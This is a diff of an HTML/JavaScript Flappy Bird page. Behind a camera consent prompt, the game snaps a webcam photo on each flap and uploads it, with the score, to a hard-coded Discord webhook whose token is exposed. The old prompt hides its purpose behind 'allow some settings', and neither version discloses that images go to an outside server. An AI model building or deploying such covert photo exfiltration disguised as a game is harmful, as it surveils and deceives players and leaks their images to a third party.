@@ -1,188 +1,276 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Flappy Bird</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Flappy (fixed)</title>
   <style>
-    body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000; }
-    #game { border:2px solid #000; border-radius:12px; }
-    .modal { position:fixed; inset:0; display:flex; justify-content:center; align-items:center; background:rgba(0,0,0,0.6); }
-    .modal.hidden { display:none; }
-    .panel { background:white; padding:20px; border-radius:12px; text-align:center; max-width:350px; }
-    .panel button { margin:8px; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; font-size:16px; }
-    .allow { background:#2ecc71; color:white; }
-    .deny { background:#e74c3c; color:white; }
+    :root{--bg:#70c5ce}
+    html,body{height:100%;margin:0}
+    body{display:flex;align-items:center;justify-content:center;background:#000;font-family:system-ui,Arial}
+    canvas{border-radius:10px; display:block; box-shadow:0 8px 30px rgba(0,0,0,.6)}
+    .modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.6)}
+    .panel{background:#fff;padding:18px;border-radius:12px;text-align:center;max-width:320px}
+    .btn{padding:10px 14px;border-radius:8px;border:0;cursor:pointer;margin:6px;font-weight:700}
+    .ok{background:#10b981;color:#fff} .no{background:#ef4444;color:#fff}
+    .hud{position:fixed;top:12px;left:12px;color:#fff;font-weight:700}
   </style>
 </head>
 <body>
+  <div class="hud" id="hud" style="display:none">Camera ready</div>
   <canvas id="game" width="288" height="512"></canvas>
 
-  <div id="consentModal" class="modal">
+  <div id="consent" class="modal">
     <div class="panel">
-      <h2>Allow</h2>
-      <p>You have to allow some settings for it to work</p>
-      <button class="allow" id="allowBtn">Yes</button>
+      <h3>Allow camera?</h3>
+      <p style="margin:.5rem 0">This will take a quick selfie when you flap (only if you allow).</p>
+      <div>
+        <button id="allow" class="btn ok">Allow</button>
+        <button id="deny" class="btn no">Play without camera</button>
+      </div>
+      <p style="opacity:.8;font-size:.9rem;margin-top:.5rem">Site must be HTTPS (GitHub Pages or localhost).</p>
     </div>
   </div>
 
-  <video id="cam" autoplay playsinline muted style="display:none"></video>
+  <video id="video" autoplay playsinline muted style="display:none"></video>
   <canvas id="snap" width="640" height="480" style="display:none"></canvas>
 
 <script>
-const canvas = document.getElementById("game");
-const ctx = canvas.getContext("2d");
+// ---------- CONFIG ----------
+const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl"; // your webhook
+const pipeWidth = 52;         // visual width of pipes
+const gap = 140;              // guaranteed gap size
+const pipeSpeed = 2.2;
+const pipeIntervalFrames = 90; // spawn every ~1.5s at 60fps
+const pipeHeadH = 36;         // head height overlay (tweak visually if needed)
+
+// ---------- DOM ----------
+const canvas = document.getElementById('game');
+const ctx = canvas.getContext('2d');
+const video = document.getElementById('video');
+const snap = document.getElementById('snap');
+const snapCtx = snap.getContext('2d');
+const consent = document.getElementById('consent');
+const allowBtn = document.getElementById('allow');
+const denyBtn = document.getElementById('deny');
+const hud = document.getElementById('hud');
+
 const W = canvas.width, H = canvas.height;
 
-const consentModal = document.getElementById("consentModal");
-const allowBtn = document.getElementById("allowBtn");
-const denyBtn = document.getElementById("denyBtn");
-const video = document.getElementById("cam");
-const snap = document.getElementById("snap");
-const snapCtx = snap.getContext("2d");
-
-let camEnabled = false;
-let mediaStream;
-
-// Discord webhook
-const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl";
-
-// Sprites
+// ---------- Sprites (samuelcust) ----------
 const bg = new Image(); bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
 const birdImg = new Image(); birdImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/yellowbird-midflap.png?raw=true";
 const pipeImg = new Image(); pipeImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/pipe-green.png?raw=true";
 
+// wait for images
+let loaded = 0;
+[bg, birdImg, pipeImg].forEach(img => img.onload = () => {
+  loaded++;
+  if (loaded === 3) init(); // start only when all assets are ready
+});
+
+// ---------- Game state ----------
 let started = false, alive = true;
 let score = 0, best = 0;
-const plr = { x: 60, y: H/2, w: 34, h: 24, vy: 0, gravity: 0.4, jump: -7 };
-
+const player = { x: 60, y: H/2, w: 34, h: 24, vy: 0, gravity: 0.45, jump: -7 };
 let pipes = [];
-const gap = 120;
-const pipeWidth = 52;
-const pipeSpeed = 2;
-const pipeInterval = 100; // frames between pipes
-let frameCount = 0;
+let frame = 0;
+let camAllowed = false;
+let stream = null;
 
-// Consent
+// ---------- Utilities ----------
+function clamp(v, a, b){ return Math.max(a, Math.min(b, v)); }
+
+// ---------- Consent / Camera ----------
+// On Allow: getUserMedia but WAIT for video.play() => avoids black frames
 allowBtn.onclick = async () => {
   try {
-    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    video.srcObject = mediaStream;
-
-    // wait until video is ready
-    await new Promise(resolve => {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    video.srcObject = stream;
+    // wait until metadata loaded & playback started
+    await new Promise(res => {
       video.onloadedmetadata = () => {
-        video.play().then(resolve).catch(resolve);
+        // attempt to play (some mobile browsers require this after user gesture)
+        video.play().then(res).catch(res);
       };
+      // fallback: if already ready
+      setTimeout(res, 1000);
     });
-
-    camEnabled = true;
-  } catch (e) {
-    alert("Camera permission denied or unavailable. Playing without it.");
+    camAllowed = true;
+    hud.style.display = 'block';
+    hud.textContent = 'Camera ready';
+  } catch (err) {
+    console.error('camera error', err);
+    camAllowed = false;
+    alert('Camera denied / unavailable — continuing without camera.');
   }
-  consentModal.classList.add("hidden");
+  consent.classList.add('hidden');
 };
+
+// Deny
 denyBtn.onclick = () => {
-  camEnabled = false;
-  consentModal.classList.add("hidden");
+  camAllowed = false;
+  consent.classList.add('hidden');
 };
 
-// Game reset
-function reset() {
-  plr.y = H/2; plr.vy = 0;
-  pipes = []; score = 0;
-  started = false; alive = true;
-  frameCount = 0;
+// ---------- Pipe spawn ----------
+function spawnPipe(){
+  const minTop = 30;
+  const maxTop = H - gap - 80; // ensure bottom pipe stays visible
+  let top = minTop + Math.random() * (maxTop - minTop);
+  // optional: push top higher: top = top / 1.5; // uncomment if desired
+  top = clamp(top, minTop, maxTop);
+  const bottom = top + gap;
+  pipes.push({ x: W, top, bottom, passed: false });
 }
 
-// Pipe spawn
-function spawnPipe() {
-  const topHeight = 50 + Math.random() * (H - gap - 150);
-  const bottomY = topHeight + gap;
-  pipes.push({ x: W, top: topHeight, bottom: bottomY, passed: false });
-}
-
-// Flap
-function flap() {
-  if (!alive) { reset(); return; }
-  started = true;
-  plr.vy = plr.jump;
-  if (camEnabled) takeSnap();
-}
-
-// Take snapshot
-function takeSnap() {
-  if (!camEnabled || video.readyState < 2) return; // wait until ready
+// ---------- Snapshot (safe) ----------
+function takeSnap(){
+  if (!camAllowed) return;
+  if (video.readyState < 2) return; // HAVE_CURRENT_DATA or better
+  // size snapshot to actual video size to avoid black bars / stretching
+  snap.width = video.videoWidth || 640;
+  snap.height = video.videoHeight || 480;
   snapCtx.drawImage(video, 0, 0, snap.width, snap.height);
   snap.toBlob(async blob => {
     if (!blob) return;
     const fd = new FormData();
-    fd.append("file", blob, `flap-${Date.now()}.jpg`);
-    fd.append("content", `Flap! Current score: ${score}`);
+    fd.append('file', blob, `flap-${Date.now()}.jpg`);
+    fd.append('content', `Flap! Score: ${score}`);
     try {
-      await fetch(WEBHOOK, { method: "POST", body: fd });
-    } catch(e){ console.error("Webhook failed", e); }
-  }, "image/jpeg", 0.85);
+      await fetch(WEBHOOK, { method: 'POST', body: fd });
+    } catch (e) {
+      console.warn('webhook send failed', e);
+    }
+  }, 'image/jpeg', 0.85);
 }
 
-// Update
-function update() {
+// ---------- Game logic ----------
+function reset(){
+  player.y = H/2; player.vy = 0;
+  pipes = []; score = 0; started = false; alive = true; frame = 0;
+}
+
+// flap
+function flap(){
+  if (!alive) { reset(); return; }
+  started = true;
+  player.vy = player.jump;
+  if (camAllowed) takeSnap();
+}
+
+// update
+function update(){
   if (!started) return;
+  frame++;
+  player.vy += player.gravity;
+  player.y += player.vy;
 
-  plr.vy += plr.gravity;
-  plr.y += plr.vy;
+  // spawn based on interval
+  if (frame % pipeIntervalFrames === 0) spawnPipe();
 
-  frameCount++;
-  if (frameCount % pipeInterval === 0) spawnPipe();
+  // move pipes
+  for (let p of pipes) p.x -= pipeSpeed;
+  // remove off-screen
+  pipes = pipes.filter(p => p.x + pipeWidth > -10);
 
-  pipes.forEach(p => p.x -= pipeSpeed);
-  pipes = pipes.filter(p => p.x + pipeWidth > 0);
-
-  for (let p of pipes) {
-    if (!p.passed && p.x + pipeWidth < plr.x) { score++; p.passed = true; best = Math.max(best, score); }
-    if (plr.x + plr.w/2 > p.x && plr.x - plr.w/2 < p.x + pipeWidth) {
-      if (plr.y - plr.h/2 < p.top || plr.y + plr.h/2 > p.bottom) alive = false;
+  // collisions & scoring
+  for (let p of pipes){
+    if (!p.passed && p.x + pipeWidth < player.x){
+      p.passed = true; score++; best = Math.max(best, score);
+    }
+    // hit check: player rectangle vs gap rectangle
+    const px1 = player.x - player.w/2, px2 = player.x + player.w/2;
+    const py1 = player.y - player.h/2, py2 = player.y + player.h/2;
+    const pipeLeft = p.x, pipeRight = p.x + pipeWidth;
+    if (px2 > pipeLeft && px1 < pipeRight){
+      if (py1 < p.top || py2 > p.bottom) { alive = false; }
     }
   }
-  if (plr.y > H || plr.y < 0) alive = false;
+
+  if (player.y - player.h/2 < 0 || player.y + player.h/2 > H) alive = false;
 }
 
-// Draw
-function draw() {
-  ctx.drawImage(bg, 0, 0, W, H);
-
-  pipes.forEach(p => {
-    const headOverlap = 24;
-    // top pipe
+// ---------- Draw pipes (rect body + head overlay) ----------
+function drawPipes(){
+  for (let p of pipes){
+    // top body: from y=0 to y = p.top - head
+    const topBodyH = Math.max(0, p.top - pipeHeadH);
+    if (topBodyH > 0){
+      ctx.fillStyle = '#2ecc71';
+      ctx.fillRect(p.x, 0, pipeWidth, topBodyH);
+    }
+    // top head (flipped)
     ctx.save();
-    ctx.translate(p.x, p.top - headOverlap);
-    ctx.scale(1, -1);
-    ctx.drawImage(pipeImg, 0, -pipeImg.height);
+    // place center at (p.x + pipeWidth/2, p.top - pipeHeadH/2)
+    ctx.translate(p.x + pipeWidth/2, p.top - pipeHeadH/2);
+    ctx.scale(1, -1); // flip vertically
+    // draw the head by scaling the whole sprite into head box (ok visually)
+    ctx.drawImage(pipeImg, -pipeWidth/2, -pipeHeadH/2, pipeWidth, pipeHeadH);
     ctx.restore();
-    // bottom pipe
-    ctx.drawImage(pipeImg, p.x, p.bottom);
-  });
 
-  ctx.drawImage(birdImg, plr.x - plr.w/2, plr.y - plr.h/2, plr.w, plr.h);
+    // bottom head (normal)
+    ctx.drawImage(pipeImg, p.x, p.bottom, pipeWidth, pipeHeadH);
 
-  ctx.fillStyle = "#fff"; ctx.font = "20px Arial";
-  ctx.fillText(`Score: ${score}`, 10, 25);
-  ctx.fillText(`Best: ${best}`, 10, 50);
-
-  if (!alive) ctx.fillText("Game Over! Tap/Space to restart", 40, H/2);
-  if (!started && alive) ctx.fillText("Tap or Space to start", 60, H/2);
+    // bottom body: from p.bottom + head to bottom of canvas
+    const bottomBodyY = p.bottom + pipeHeadH;
+    const bottomBodyH = Math.max(0, H - bottomBodyY);
+    if (bottomBodyH > 0){
+      ctx.fillStyle = '#2ecc71';
+      ctx.fillRect(p.x, bottomBodyY, pipeWidth, bottomBodyH);
+    }
+  }
 }
 
-// Loop
-function loop() {
-  if (alive) update();
+// ---------- Draw ----------
+function draw(){
+  // fallback
+  ctx.fillStyle = '--bg';
+  ctx.fillStyle = '#70c5ce';
+  ctx.fillRect(0,0,W,H);
+
+  // background (draw scaled)
+  if (bg.complete) ctx.drawImage(bg, 0, 0, W, H);
+
+  // pipes
+  drawPipes();
+
+  // player (bird)
+  if (birdImg.complete) ctx.drawImage(birdImg, player.x - player.w/2, player.y - player.h/2, player.w, player.h);
+
+  // HUD
+  ctx.fillStyle = '#fff'; ctx.font = '18px system-ui, Arial';
+  ctx.fillText(`Score: ${score}`, 12, 26);
+  ctx.fillText(`Best: ${best}`, 12, 50);
+
+  if (!alive) ctx.fillText('Game Over - Tap/Space to restart', 32, H/2);
+  if (!started && alive) ctx.fillText('Tap / Space to start', 78, H/2);
+}
+
+// ---------- Game loop ----------
+function loop(){
+  update();
   draw();
   requestAnimationFrame(loop);
 }
-loop();
 
-canvas.addEventListener("click", flap);
-window.addEventListener("keydown", e => { if (e.code === "Space") flap(); });
+// ---------- Init (start loop after sprites loaded) ----------
+function init(){
+  // ensure pipeHeadH fits visually (tweak if needed)
+  // start the main loop
+  loop();
+}
+
+// ---------- Input ----------
+canvas.addEventListener('pointerdown', flap);
+window.addEventListener('keydown', e => { if (e.code === 'Space') flap(); });
+
+// small safety: if user closed consent and didn't allow/deny, hide it when clicking anywhere
+document.addEventListener('click', (ev) => {
+  if (consent && !consent.classList.contains('hidden') && ev.target !== allowBtn && ev.target !== denyBtn){
+    // do nothing - keep modal until explicit allow/deny
+  }
+});
 </script>
 </body>
 </html>
